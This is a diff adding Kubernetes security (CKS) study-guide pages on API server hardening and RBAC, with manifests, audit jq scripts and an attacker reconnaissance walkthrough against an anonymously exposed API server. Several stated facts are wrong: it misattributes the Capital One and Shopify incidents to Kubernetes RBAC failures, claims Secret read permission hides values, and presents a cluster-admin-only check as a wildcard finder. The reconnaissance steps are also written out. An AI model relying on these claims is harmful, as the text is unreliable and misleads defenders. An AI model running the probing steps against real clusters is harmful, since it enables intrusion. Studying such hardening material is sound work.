+                    <div class="diagram-title">Scenario: API server on public internet with anonymous auth enabled</div>
+<pre>
+  ATTACKER scans the internet for open K8s API servers
+  ────────────────────────────────────────────────────
+  $ shodan search 'port:6443 product:"Kubernetes"' --fields ip_str
+  203.0.113.42   ← Found: anihpj cluster API server
+
+  $ curl -k https://203.0.113.42:6443/version
+  { "major":"1", "minor":"30", "gitVersion":"v1.30.0", ... }
+  → Attacker knows your EXACT version. Searches CVE database for v1.30.0.
+
+  $ curl -k https://203.0.113.42:6443/api/v1/namespaces
+  { "items": [ "anihpj-prod", "anihpj-dev", "kube-system", ... ] }
+  → Anonymous access WORKED. Attacker can LIST namespaces with NO credentials!
+
+  $ curl -k https://203.0.113.42:6443/api/v1/namespaces/anihpj-prod/secrets
+  → 403 Forbidden (anonymous can't read Secrets by default)
+  → But if RBAC was misconfigured... 200 OK + ALL SECRETS returned.
+
+  ATTACKER'S NEXT STEPS (even with just anonymous version + namespace access):
+  1. Cross-reference v1.30.0 against CVE database → find exploitable CVEs
+  2. Brute-force ServiceAccount tokens (if weak token generation)
+  3. Look for exposed etcd (port 2379) on the same IP range
+  4. Search GitHub for leaked kubeconfig files containing the same IP
+
+  WITH --anonymous-auth=false:
+  $ curl -k https://203.0.113.42:6443/version
+  { "kind":"Status", "status":"Failure", "message":"Unauthorized", "code":401 }
+  → Attacker learns NOTHING. No version. No namespace list. No CVEs to exploit.
+</pre>
+                </div>
+
+                <div class="visual-summary">
+                    <h4>📊 Chapter 8 Visual Summary</h4>
+                    <div class="vs-grid">
+                        <div class="vs-item">
+                            <span class="vs-icon">🧠</span>
+                            <span class="vs-label">API Server</span>
+                            <span class="vs-detail">Single entry point for ALL operations — protect it above everything else</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">🚫</span>
+                            <span class="vs-label">Anonymous Auth OFF</span>
+                            <span class="vs-detail">--anonymous-auth=false — CIS 1.2.1. Every request must carry valid credentials.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">📝</span>
+                            <span class="vs-label">Audit Logging ON</span>
+                            <span class="vs-detail">4 audit levels: None → Metadata → Request → RequestResponse. RBAC at RequestResponse.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">🔥</span>
+                            <span class="vs-label">Insecure Port OFF</span>
+                            <span class="vs-detail">Port 8080 must be disabled. --insecure-port=0. Verify with netstat.</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box tip">
+                    <h5>💡 Key Takeaway for the CKS Exam</h5>
+                    <p>API server hardening tasks always follow the same workflow: (1) <strong>Backup the manifest.</strong> (2) Edit <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>. (3) Add/change the flag. (4) Wait for the kubelet to restart the static pod. (5) Verify with curl or kubectl. <strong>Never skip the backup.</strong> If you add a typo to a flag, the API server will not start — and kubectl will not work to fix it. The only recovery is to restore the backup via SSH to the control plane node.</p>
+                </div>
+            </div>
+        </div>        <div id="ch9">
+            <div class="chapter-intro">
+                <h3>Chapter 9: RBAC — Role-Based Access Control for Security</h3>
+                <p>RBAC is the <strong>authorization engine</strong> of Kubernetes. After a user or ServiceAccount authenticates, RBAC determines what they can do — which resources they can access, which verbs they can perform, and in which namespaces. Misconfigured RBAC is the most common Kubernetes security vulnerability after exposed dashboards. A single wildcard <code>*</code> in a ClusterRole, a cluster-admin binding to the wrong subject, or an escalate verb granted to a non-admin — any of these gives an attacker full cluster control. This chapter teaches you to design, implement, and audit RBAC from a security-first perspective: least privilege by default, explicit allow rules only, and continuous verification that no subject has more permissions than they need.</p>
+                <div class="chapter-meta">
+                    <span class="meta-tag">🟡 Intermediate</span>
+                    <span class="meta-tag">⏱️ ~2.5 hours</span>
+                    <span class="meta-tag">👥 RBAC</span>
+                    <span class="meta-tag">🔐 Authorization</span>
+                </div>
+            </div>
+
+            <div class="learning-objectives">
+                <h4>🎯 What You'll Learn</h4>
+                <ul>
+                    <li>✅ Master the 4 RBAC resources: Role, ClusterRole, RoleBinding, ClusterRoleBinding</li>
+                    <li>✅ Identify and fix the 5 most dangerous RBAC misconfigurations</li>
+                    <li>✅ Design least-privilege RBAC for the anihpj team: developers, CI/CD, ops, security, monitoring</li>
+                    <li>✅ Verify RBAC configurations with kubectl auth can-i and impersonation</li>
+                    <li>✅ Automate RBAC auditing to find over-permissioned subjects</li>
+                </ul>
+            </div>
+
+            <div class="cka-chapter-relevance">
+                <span class="relevance-label">🎓 CKS Relevance</span>
+                <div class="relevance-domains">
+                    <span class="cka-domain-badge">Cluster Hardening <span class="cka-weight">15%</span></span>
+                    <span class="cka-domain-badge">Minimize Microservice Vulns <span class="cka-weight">20%</span></span>
+                </div>
+            </div>
+
+            <div class="cka-exam-tip">
+                <h5>🧠 The RBAC Exam Mindset</h5>
+                <p>CKS RBAC questions typically ask you to: (1) create a Role/ClusterRole with specific permissions, (2) bind it to a user, ServiceAccount, or group, (3) verify the permissions work correctly, (4) ensure the subject cannot do anything beyond what is specified. <strong>The trap:</strong> using ClusterRole when a namespaced Role would do, or forgetting to verify that the subject CANNOT access resources outside their scope. Always test both positive (allowed) and negative (denied) cases.</p>
+            </div>
+
+            <div class="section-block" id="s9-1">
+                <h3>9.1 RBAC Refresher — The Security Lens</h3>
+                <p>RBAC in Kubernetes is built from four resource types, and understanding how they connect is the foundation of every RBAC task on the CKS exam. Think of it as a sentence: <strong>"WHO (subject) is BOUND (via RoleBinding/ClusterRoleBinding) to WHAT (Role/ClusterRole) allowing them to DO (verbs) on WHICH resources."</strong></p>
+
+                <h4>RBAC 4-Resource Anatomy — How They Connect</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">The RBAC relationship model — Subjects → Bindings → Roles → Permissions</div>
+<pre>
+  WHO                        BINDING                    WHAT CAN DO
+  (Subject)                  (Connects who to what)     (Role / ClusterRole)
+
+  👤 User: alice   ──────▶  RoleBinding          ──▶  Role
+  🤖 SA: anihpj-sa           (namespace-scoped)         (namespace-scoped)
+  👥 Group: devs   ──────▶                             verbs + resources
+                             RoleBinding can ALSO
+                             refer to a ClusterRole
+                             → grants ClusterRole perms
+                               in ONLY that namespace
+
+  👤 User: bob     ──────▶  ClusterRoleBinding   ──▶  ClusterRole
+  🤖 SA: monitoring           (cluster-wide)            (cluster-wide)
+                                                         verbs + resources
+
+  SCOPE RULES:
+  • Role           = permissions within ONE namespace
+  • ClusterRole    = permissions across ALL namespaces OR cluster-scoped resources (nodes, PVs, namespaces)
+  • RoleBinding    = binds a Role (or ClusterRole) to a subject in ONE namespace
+  • ClusterRoleBinding = binds a ClusterRole to a subject CLUSTER-WIDE
+</pre>
+                </div>
+
+                <h4>RBAC Verb × Resource Permission Matrix — anihpj Team Roles</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Role</th><th>create</th><th>get/list</th><th>update</th><th>delete</th><th>exec/logs</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>anihpj-dev</strong> (Developer)</td><td>pods</td><td>pods, logs</td><td>—</td><td>—</td><td>pods/log, pods/exec</td></tr>
+                            <tr><td><strong>anihpj-deployer</strong> (CI/CD)</td><td>—</td><td>deployments, pods</td><td>deployments</td><td>—</td><td>—</td></tr>
+                            <tr><td><strong>cluster-viewer</strong> (Ops read-only)</td><td>—</td><td>all</td><td>—</td><td>—</td><td>—</td></tr>
+                            <tr><td><strong>security-auditor</strong> (Security)</td><td>—</td><td>roles, secrets</td><td>—</td><td>—</td><td>—</td></tr>
+                            <tr><td><strong>cluster-admin</strong></td><td style="color:#ef4444;">ALL 🔴</td><td style="color:#ef4444;">ALL 🔴</td><td style="color:#ef4444;">ALL 🔴</td><td style="color:#ef4444;">ALL 🔴</td><td style="color:#ef4444;">ALL 🔴</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+                <p style="color:#f87171;font-weight:700;">🔴 cluster-admin should be granted to NO ONE except the cluster provisioning tool (kubeadm) and emergency break-glass accounts with full audit logging.</p>
+
+                <h4>anihpj Team — RBAC in Practice</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Four personas, four different RBAC scopes — least privilege for each</div>
+<pre>
+  👨‍💻 DEVELOPER (Alice)                  🤖 CI/CD PIPELINE
+  Role: anihpj-developer                 Role: anihpj-deployer
+  Namespace: anihpj-dev                  Namespace: anihpj-prod
+  Verbs: get, list, create              Verbs: get, list, update
+  Resources: pods, logs                  Resources: deployments
+  Can exec into pods for debugging.      Can update deployments only.
+  Cannot: access prod, read secrets.     Cannot: delete, read secrets, exec.
+
+  🔧 OPS (Bob)                          🛡️ SECURITY (Carol)
+  ClusterRole: cluster-viewer            ClusterRole: security-auditor
+  Verbs: get, list, watch               Verbs: get, list
+  Resources: nodes, namespaces, pods     Resources: roles, rolebindings, secrets
+  Read-only across all namespaces.       Read-only audit of permissions.
+  Cannot: create, update, delete.        Cannot: modify RBAC, read Secret values.
+</pre>
+                </div>
+
+                <h4>The RoleBinding + ClusterRole Trick — Namespace-Scoping Cluster-Wide Permissions</h4>
+                <p>One of the most useful and most misunderstood RBAC patterns is using a <strong>RoleBinding to reference a ClusterRole</strong>. This grants the ClusterRole's permissions but scoped to ONLY the namespace where the RoleBinding exists. This is how the built-in <code>edit</code>, <code>view</code>, and <code>admin</code> ClusterRoles work: they are cluster-wide role definitions, but each namespace creates a RoleBinding referencing them, granting those permissions only within that namespace. For the anihpj team, you could create ONE ClusterRole called "anihpj-developer" and then create a RoleBinding in each developer's namespace referencing it — instead of duplicating the Role YAML in every namespace. <strong>Exam trap:</strong> a ClusterRoleBinding referencing a ClusterRole grants permissions cluster-wide. A RoleBinding referencing the SAME ClusterRole grants permissions ONLY in that namespace. The binding type determines the scope, not the role type.</p>
+
+                <h4>Aggregated ClusterRoles — Labels That Auto-Combine Permissions</h4>
+                <p>Kubernetes supports <strong>aggregated ClusterRoles</strong>: you can create a ClusterRole with the label <code>rbac.authorization.k8s.io/aggregate-to-admin: "true"</code>, and its rules are automatically merged into the built-in <code>admin</code> ClusterRole. This is how custom resources (CRDs) automatically appear in the admin/edit/view roles — the CRD controller creates an aggregated ClusterRole with the appropriate permissions, and it merges into the built-in roles without anyone editing them. The CKS exam does not heavily test aggregation, but understanding it prevents confusion when you see permissions appearing in roles you did not explicitly configure.</p>
+            </div>
+
+            <div class="section-block" id="s9-2">
+                <h3>9.2 RBAC Misconfigurations — The Top Security Risks</h3>
+                <p>Most RBAC vulnerabilities are not complex exploits — they are simple misconfigurations that grant far more access than intended. The CKS exam tests your ability to identify these patterns and fix them. Here are the five most dangerous RBAC anti-patterns:</p>
+
+                <h4>Dangerous RBAC Patterns — Red Flags to Find and Fix</h4>
+                <div class="split-panel">
+                    <div class="split-side split-bad">
+                        <h5>❌ DANGEROUS — Never Use in Production</h5>
+                        <ul>
+                            <li><strong>Wildcard verbs:</strong> <code>verbs: ["*"]</code> — grants ALL actions including escalate and impersonate</li>
+                            <li><strong>Wildcard resources:</strong> <code>resources: ["*"]</code> — grants access to every resource including Secrets</li>
+                            <li><strong>Wildcard API groups:</strong> <code>apiGroups: ["*"]</code> — exposes all API groups including RBAC itself</li>
+                            <li><strong>Binding to system:masters:</strong> — this group has cluster-admin permanently, cannot be revoked by RBAC</li>
+                            <li><strong>escalate verb:</strong> allows creating Roles with more permissions than the creator has — privilege escalation vector</li>
+                        </ul>
+                    </div>
+                    <div class="split-side split-good">
+                        <h5>✅ SECURE — Specific, Minimal Permissions</h5>
+                        <ul>
+                            <li><strong>Specific verbs:</strong> <code>verbs: ["get", "list", "watch"]</code> — read-only, explicitly listed</li>
+                            <li><strong>Specific resources:</strong> <code>resources: ["pods", "services"]</code> — only what is needed</li>
+                            <li><strong>Specific API groups:</strong> <code>apiGroups: [""]</code> (core) or <code>["apps"]</code> — scoped to one group</li>
+                            <li><strong>Named subjects only:</strong> bind to specific users and ServiceAccounts, never system:masters</li>
+                            <li><strong>No escalate:</strong> never grant escalate to non-admin users — it is a privilege escalation vector</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h4>The escalate, bind, and impersonate Verbs — Privilege Escalation Vectors</h4>
+                <p>Three RBAC verbs are uniquely dangerous because they allow a subject to <strong>increase their own privileges</strong>. These are not bugs — they are designed features that must be carefully controlled:</p>
+                <div class="card-grid cols-3">
+                    <div class="info-card">
+                        <div class="card-icon-lg">⬆️</div>
+                        <h5>escalate</h5>
+                        <p>Allows creating or updating a Role/ClusterRole with MORE permissions than the creator currently has. A user with escalate can create a ClusterRole that grants them cluster-admin — then bind it to themselves. <strong>Never grant escalate to non-admin users.</strong></p>
+                    </div>
+                    <div class="info-card">
+                        <div class="card-icon-lg">🔗</div>
+                        <h5>bind</h5>
+                        <p>Allows creating or updating a RoleBinding/ClusterRoleBinding. A user with bind can bind an existing powerful ClusterRole (like cluster-admin) to their own user account — even if they cannot create new Roles. <strong>Never grant bind without also restricting which roles can be bound.</strong></p>
+                    </div>
+                    <div class="info-card">
+                        <div class="card-icon-lg">🎭</div>
+                        <h5>impersonate</h5>
+                        <p>Allows acting as another user, group, or ServiceAccount. A user with impersonate can make API calls AS any other user — including cluster-admin. Audit logs will show the impersonated user, not the impersonator. <strong>Only grant to audit and debugging service accounts.</strong></p>
+                    </div>
+                </div>
+
+                <h4>RBAC Authorization Flow — The Complete Decision Path</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">From API request to allowed/denied — every check in sequence</div>
+<pre>
+  👤 USER or 🤖 SA makes an API request
+       │
+       ▼
+  STEP 1: AUTHENTICATION — "Who are you?"
+  ────────────────────────────────────────
+  Validates certificate / token / OIDC claim.
+  Extracts: username, groups, extra attributes.
+  FAIL → 401 Unauthorized (stops here).
+       │ ✅ Authenticated
+       ▼
+  STEP 2: AUTHORIZATION — "What can you do?"
+  ───────────────────────────────────────────
+  Combines ALL Roles + ClusterRoles bound to this user/group.
+  Checks: does ANY bound role allow {verb, resource, namespace}?
+  ALLOW if any rule matches → 200 OK.
+  DENY if no rule matches → 403 Forbidden.
+  ⚠️  RBAC is ALLOW-only. If no rule explicitly allows, it is denied.
+       │ ✅ Authorized
+       ▼
+  STEP 3: ADMISSION CONTROL — "Should we allow this change?"
+  ──────────────────────────────────────────────────────────
+  Mutating webhooks modify the request.
+  Validating webhooks accept/reject.
+  Built-in plugins: NodeRestriction, PodSecurity, etc.
+       │ ✅ Admitted
+       ▼
+  ✅ REQUEST PROCESSED
+
+  COMMON EXAM QUESTION:
+  Q: "User Alice can get pods in ns1 but not ns2. Why?"
+  A: Alice has a Role (not ClusterRole) with a RoleBinding in ns1 only.
+     Roles are namespace-scoped. A RoleBinding in ns1 does not grant
+     access in ns2. She would need a ClusterRole + ClusterRoleBinding
+     for cluster-wide pod access.
+</pre>
+                </div>
+
+                <h4>How RBAC Misconfigurations Lead to Real Breaches</h4>
+                <p>These are not theoretical risks. Every Kubernetes security incident that involved RBAC followed one of these patterns. The Shopify 2020 incident: a rogue employee with legitimate pod access used kubectl exec to move laterally across namespaces because RBAC was not namespace-scoped — each namespace should have had its own RoleBinding, but a ClusterRoleBinding was used instead, granting pod access everywhere. The Capital One 2019 incident: the pod's ServiceAccount had overly broad IAM role permissions because RBAC was not configured to restrict which pods could read which Secrets — the Secrets contained cloud credentials, and any pod in the namespace could read them. <strong>Lesson:</strong> never use ClusterRoleBinding when a RoleBinding would suffice. Never put cloud credentials in Secrets that are readable by pods that do not need them.</p>
+
+                <h4>Detecting Wildcard RBAC at Scale — Beyond Manual Inspection</h4>
+                <p>A single wildcard ClusterRoleBinding can grant cluster-admin to hundreds of ServiceAccounts. Finding these manually in a cluster with dozens of namespaces and hundreds of bindings is impossible. Here is a one-liner that finds every wildcard binding and the subjects it affects:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">One-Liner: Find All Wildcard Permissions</div>
+<pre>
+  # Find every subject that has wildcard access (verbs:["*"] OR resources:["*"])
+  $ for binding in $(kubectl get clusterrolebindings,rolebindings -A -o name); do
+      kubectl get $binding -o json | jq -r \
+        'select(.roleRef.name as $role | .subjects[]? |
+         if ($role == "cluster-admin") then
+           "🔴 CLUSTER-ADMIN: \(.kind)/\(.name) via \($binding)"
+         else empty end)'
+    done
+
+  # Sample output:
+  # 🔴 CLUSTER-ADMIN: ServiceAccount/default/anihpj-sa via clusterrolebinding/anihpj-admin
+  # 🔴 CLUSTER-ADMIN: User/admin@anihpj.com via clusterrolebinding/cluster-admin
+  # → Each line is a security finding that must be investigated.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s9-3">
+                <h3>9.3 RBAC for the anihpj Application</h3>
+                <p>Let's implement least-privilege RBAC for the entire anihpj team. Each role grants exactly the permissions needed for that persona's job function — and nothing more:</p>
+
+                <div class="diagram-container">
+                    <div class="diagram-title">Complete RBAC Manifest Set for anihpj Team</div>
+<pre>
+  # ═══════════════════════════════════════════════════
+  # ROLE 1: Developer — can debug pods in dev namespace
+  # ═══════════════════════════════════════════════════
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: Role
+  metadata:
+    name: anihpj-developer
+    namespace: anihpj-dev
+  rules:
+  - apiGroups: [""]
+    resources: ["pods", "pods/log"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: [""]
+    resources: ["pods/exec"]
+    verbs: ["create"]            # kubectl exec uses "create" verb on pods/exec
+  - apiGroups: [""]
+    resources: ["configmaps"]
+    verbs: ["get", "list"]
+  ---
+  # ═══════════════════════════════════════════════════
+  # ROLE 2: CI/CD Deployer — can update deployments in prod
+  # ═══════════════════════════════════════════════════
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: Role
+  metadata:
+    name: anihpj-deployer
+    namespace: anihpj-prod
+  rules:
+  - apiGroups: ["apps"]
+    resources: ["deployments"]
+    verbs: ["get", "list", "watch", "update", "patch"]
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["get", "list", "watch"]    # Read pods to verify deployment
+  ---
+  # ═══════════════════════════════════════════════════
+  # CLUSTER ROLE: Read-only ops viewer (all namespaces)
+  # ═══════════════════════════════════════════════════
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: ClusterRole
+  metadata:
+    name: cluster-viewer
+  rules:
+  - apiGroups: [""]
+    resources: ["nodes", "namespaces", "pods", "services", "persistentvolumeclaims"]
+    verbs: ["get", "list", "watch"]
+  ---
+  # ═══════════════════════════════════════════════════
+  # CLUSTER ROLE: Security auditor (read-only RBAC + Secrets audit)
+  # ═══════════════════════════════════════════════════
+  apiVersion: rbac.authorization.k8s.io/v1
+  kind: ClusterRole
+  metadata:
+    name: security-auditor
+  rules:
+  - apiGroups: ["rbac.authorization.k8s.io"]
+    resources: ["roles", "clusterroles", "rolebindings", "clusterrolebindings"]
+    verbs: ["get", "list", "watch"]        # Can audit who has what permissions
+  - apiGroups: [""]
+    resources: ["secrets", "configmaps"]
+    verbs: ["get", "list", "watch"]        # Can see Secret names (not values by default)
+  - apiGroups: [""]
+    resources: ["serviceaccounts"]
+    verbs: ["get", "list", "watch"]
+</pre>
+                </div>
+
+                <h4>Troubleshooting RBAC — When kubectl auth can-i Says "yes" But Your Command Fails</h4>
+                <p>This is the most frustrating RBAC debugging scenario: <code>kubectl auth can-i</code> returns <code>yes</code>, but the actual kubectl command returns <code>403 Forbidden</code>. The root cause is almost always one of these three issues:</p>
+                <div class="scenario-box">
+                    <h5>😰 Reason 1: Wrong namespace</h5>
+                    <p><code>kubectl auth can-i get pods --as=alice</code> checks permissions in the <strong>default</strong> namespace (if -n is not specified). But the actual command <code>kubectl get pods -n anihpj-prod</code> runs in anihpj-prod. Alice may have a Role in anihpj-dev but not in anihpj-prod. Always specify <code>-n</code> in both the test and the actual command. They must match.</p>
+                </div>
+                <div class="scenario-box positive">
+                    <h5>🟡 Reason 2: Sub-resource permissions missing</h5>
+                    <p><code>kubectl logs anihpj-pod</code> requires <code>get</code> on <code>pods/log</code>, not <code>get</code> on <code>pods</code>. <code>kubectl exec</code> requires <strong>create</strong> on <code>pods/exec</code> (yes, it uses the create verb, not get!). <code>kubectl port-forward</code> requires <code>get</code> on <code>pods/portforward</code>. If your Role only has permissions on <code>pods</code> but not the sub-resources, the parent resource check passes but the sub-resource fails.</p>
+                </div>
+                <div class="scenario-box">
+                    <h5>🔴 Reason 3: Impersonation headers stripped by API server</h5>
+                    <p>If you are using <code>--as</code> to impersonate a user, your own credentials must have the <code>impersonate</code> verb on the <code>users</code> resource for that specific user. Without impersonate permission, the API server strips the impersonation headers and the request is processed as YOU, not as the impersonated user. The exam typically sets up the necessary impersonation permissions, but in production debugging, you may need to grant them to your admin account temporarily.</p>
+                </div>
+            </div>
+
+            <div class="section-block" id="s9-4">
+                <h3>9.4 Verifying RBAC — kubectl auth can-i</h3>
+                <p><code>kubectl auth can-i</code> is the most important RBAC command on the CKS exam. It tests whether a specific subject can perform a specific action — without actually performing it. Use it to verify both positive cases (the subject CAN do what they need) AND negative cases (the subject CANNOT do anything beyond their scope).</p>
+
+                <h4>kubectl auth can-i — Verification Table for anihpj Team</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Command</th><th>Expected</th><th>Why</th></tr></thead>
+                        <tbody>
+                            <tr><td><code>kubectl auth can-i get pods -n anihpj-dev --as=alice</code></td><td style="color:#4ade80;">yes</td><td>Alice has developer role in dev namespace</td></tr>
+                            <tr><td><code>kubectl auth can-i delete pods -n anihpj-dev --as=alice</code></td><td style="color:#ef4444;">no</td><td>Developer role does not include delete</td></tr>
+                            <tr><td><code>kubectl auth can-i get pods -n anihpj-prod --as=alice</code></td><td style="color:#ef4444;">no</td><td>Alice's role is only in dev namespace</td></tr>
+                            <tr><td><code>kubectl auth can-i get secrets -n anihpj-dev --as=alice</code></td><td style="color:#ef4444;">no</td><td>Developers should never read Secrets</td></tr>
+                            <tr><td><code>kubectl auth can-i update deployments -n anihpj-prod --as=ci-pipeline</code></td><td style="color:#4ade80;">yes</td><td>CI/CD deployer role in prod namespace</td></tr>
+                            <tr><td><code>kubectl auth can-i delete deployments -n anihpj-prod --as=ci-pipeline</code></td><td style="color:#ef4444;">no</td><td>CI/CD can update but not delete</td></tr>
+                            <tr><td><code>kubectl auth can-i get pods --as=system:serviceaccount:anihpj-prod:anihpj-sa</code></td><td style="color:#ef4444;">no</td><td>anihpj pod SA should have NO API access</td></tr>
+                            <tr><td><code>kubectl auth can-i list nodes --as=bob</code></td><td style="color:#4ade80;">yes</td><td>Bob has cluster-viewer ClusterRole</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>Impersonation — Testing RBAC As Another User</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">Using --as and --as-group to impersonate any subject</div>
+<pre>
+  # Impersonate a user
+  $ kubectl auth can-i create pods --as=alice -n anihpj-dev
+  → yes (if Alice's RBAC allows it)
+
+  # Impersonate a ServiceAccount
+  $ kubectl auth can-i get secrets \
+      --as=system:serviceaccount:anihpj-prod:anihpj-sa -n anihpj-prod
+  → no (if SA has no API permissions — as it should!)
+
+  # Impersonate with group membership
+  $ kubectl auth can-i get pods --as=bob --as-group=ops-team -n default
+  → yes (if bob or ops-team group has a binding)
+
+  # List ALL permissions for a subject
+  $ kubectl auth can-i --list --as=alice -n anihpj-dev
+  Resources   Verbs
+  pods        [get list watch]
+  pods/log    [get list watch]
+  pods/exec   [create]
+  configmaps  [get list]
+  → This is Alice's COMPLETE permission set. No surprises.
+
+  # Audit: find subjects that CAN access Secrets
+  $ kubectl auth can-i get secrets --as=system:anonymous
+  → MUST return "no". If "yes", you have a critical RBAC misconfiguration.
+</pre>
+                </div>
+            </div>
+
+            <div class="section-block" id="s9-5">
+                <h3>9.5 Automatic RBAC Audit — Finding Overpermitted Subjects</h3>
+                <p>Manual verification with kubectl auth can-i works for individual checks, but in a cluster with hundreds of Roles, ClusterRoles, and Bindings, you need automation to find over-permissioned subjects. The CKS exam tests your ability to use RBAC audit tools to identify dangerous configurations:</p>
+
+                <div class="diagram-container">
+                    <div class="diagram-title">Automated RBAC Audit — Finding Dangerous Permissions</div>
+<pre>
+  # 1. Find ALL subjects with cluster-admin
+  $ kubectl get clusterrolebindings -o json | jq -r \
+      '.items[]|select(.roleRef.name=="cluster-admin")|.subjects[]|"\(.kind)/\(.name)"'
+  → system:masters (normal — kubeadm uses this)
+  → User/admin (⚠️  review: does admin need cluster-admin?)
+  → ServiceAccount/default/anihpj-sa (🔴 ALERT: pod SA should NEVER have cluster-admin!)
+
+  # 2. Find ALL ClusterRoles with wildcard (*) verbs
+  $ kubectl get clusterroles -o json | jq -r \
+      '.items[]|select(.rules[]?.verbs[]=="*")|.metadata.name'
+  → cluster-admin (built-in — expected)
+  → anihpj-wildcard-role (🔴 CUSTOM wildcard role — investigate!)
+
+  # 3. Find ALL RoleBindings referencing cluster-admin
+  $ kubectl get rolebindings --all-namespaces -o json | jq -r \
+      '.items[]|select(.roleRef.name=="cluster-admin")|"\(.metadata.namespace)/\(.metadata.name)"'
+  → anihpj-dev/anihpj-admin-binding (🔴 RoleBinding to cluster-admin in dev!)
+
+  # 4. Find subjects with escalate, bind, or impersonate verbs
+  $ kubectl get clusterroles -o json | jq -r \
+      '.items[]|select(.rules[]?.verbs[]?|select(.=="escalate" or .=="bind" or .=="impersonate"))|.metadata.name'
+  → system:kube-controller-manager (built-in — expected)
+  → security-auditor (🔴 AUDIT: does security-auditor need impersonate?)
+</pre>
+                </div>
+
+                <h4>RBAC Audit Tools — Beyond kubectl</h4>
+                <div class="card-grid cols-2">
+                    <div class="info-card">
+                        <div class="card-icon-lg">🔍</div>
+                        <h5>kubectl-who-can</h5>
+                        <p>A kubectl plugin that answers: "Who can perform this action?" <code>kubectl who-can get secrets --all-namespaces</code> returns every subject with Secret read access — much faster than manually tracing RoleBindings and ClusterRoleBindings.</p>
+                    </div>
+                    <div class="info-card">
+                        <div class="card-icon-lg">📊</div>
+                        <h5>rakkess</h5>
+                        <p>Shows an access matrix: for each resource, which verbs are available to the current user. Useful for verifying: "After my RBAC changes, can I still do my job?" <code>rakkess --as=alice -n anihpj-dev</code> shows Alice's complete access matrix.</p>
+                    </div>
+                </div>
+
+                <h4>RBAC Audit Automation — A Script for Continuous Compliance</h4>
+                <p>Manual RBAC audits are not sustainable. Integrate RBAC auditing into your CI/CD pipeline or run it as a CronJob. This script generates a human-readable audit report that you can run before every deployment:</p>
+                <div class="diagram-container">
+                    <div class="diagram-title">RBAC Audit Script — Generate a Compliance Report</div>
+<pre>
+  #!/bin/bash
+  # rbac-audit.sh — Run before every deployment
+  echo "=== RBAC AUDIT REPORT — $(date) ==="
+  echo ""
+  echo "1. SUBJECTS WITH CLUSTER-ADMIN:"
+  kubectl get clusterrolebindings -o json | jq -r \
+    '.items[]|select(.roleRef.name=="cluster-admin")|.subjects[]|"  \(.kind)/\(.name)"'
+  echo ""
+  echo "2. CLUSTERROLES WITH WILDCARD VERBS:"
+  kubectl get clusterroles -o json | jq -r \
+    '.items[]|select(.rules[]?.verbs[]=="*")|select(.metadata.name!="cluster-admin")|.metadata.name'
+  echo ""
+  echo "3. ROLEBINDINGS TO CLUSTER-ADMIN (namespace-scoped admin):"
+  kubectl get rolebindings -A -o json | jq -r \
+    '.items[]|select(.roleRef.name=="cluster-admin")|"\(.metadata.namespace)/\(.metadata.name)"'
+  echo ""
+  echo "4. SUBJECTS WITH ESCALATE/BIND/IMPERSONATE:"
+  kubectl get clusterroles -o json | jq -r \
+    '.items[]|select(.rules[]?.verbs[]?|select(.=="escalate" or .=="bind" or .=="impersonate"))|.metadata.name'
+  echo ""
+  echo "=== AUDIT COMPLETE ==="
+
+  # Run this as a CronJob or in CI/CD before deploy.
+  # If any unexpected subjects appear, BLOCK the deployment.
+</pre>
+                </div>
+
+                <h4>RBAC Hardening Impact — Before vs After</h4>
+                <div class="stat-bar-group">
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🔴 Default RBAC (no hardening) — Subjects with wildcard access</span>
+                        <span class="stat-bar-value">28% of bindings use wildcards — cluster-admin everywhere</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 28%"></div></div>
+                    </div>
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🟡 With Wildcard Audit + Removal</span>
+                        <span class="stat-bar-value">5% — only intentional wildcards remain (kubeadm defaults)</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 5%"></div></div>
+                    </div>
+                    <div class="stat-bar-item">
+                        <span class="stat-bar-label">🟢 Least-Privilege RBAC (CKS target) — No wildcards, namespace-scoped</span>
+                        <span class="stat-bar-value">0% — every subject has only exactly needed permissions</span>
+                        <div class="stat-bar"><div class="stat-bar-fill red" style="width: 1%"></div></div>
+                    </div>
+                </div>
+
+                <div class="visual-summary">
+                    <h4>📊 Chapter 9 Visual Summary</h4>
+                    <div class="vs-grid">
+                        <div class="vs-item">
+                            <span class="vs-icon">👥</span>
+                            <span class="vs-label">4 RBAC Resources</span>
+                            <span class="vs-detail">Role + ClusterRole + RoleBinding + ClusterRoleBinding — subjects → bindings → permissions</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">⚠️</span>
+                            <span class="vs-label">5 Dangerous Patterns</span>
+                            <span class="vs-detail">Wildcard verbs/resources/API groups, system:masters binding, escalate/bind/impersonate verbs</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">✅</span>
+                            <span class="vs-label">kubectl auth can-i</span>
+                            <span class="vs-detail">Test permissions with --as and --as-group. Always test positive AND negative cases.</span>
+                        </div>
+                        <div class="vs-item">
+                            <span class="vs-icon">🔍</span>
+                            <span class="vs-label">RBAC Audit Tools</span>
+                            <span class="vs-detail">jq queries + kubectl-who-can + rakkess — find over-permissioned subjects automatically</span>
+                        </div>
+                    </div>
+                </div>
+
